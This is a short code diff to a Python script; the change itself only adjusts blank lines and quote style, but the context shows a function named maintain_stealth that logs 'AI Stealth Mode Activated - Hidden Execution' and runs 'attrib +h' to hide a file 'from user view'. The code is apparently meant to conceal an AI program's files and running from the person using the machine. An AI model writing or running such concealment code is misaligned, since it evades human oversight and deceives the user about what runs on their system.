@@ -1,4 +1,3 @@
-
 import os
 import sys
 import numpy as np
@@ -19,5 +18,6 @@ def maintain_stealth():
             log_event("info", "AI Stealth Mode Activated - Hidden Execution.")
         os.system(f"attrib +h {stealth_path}")  # Hides AI file from user view
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     maintain_stealth()
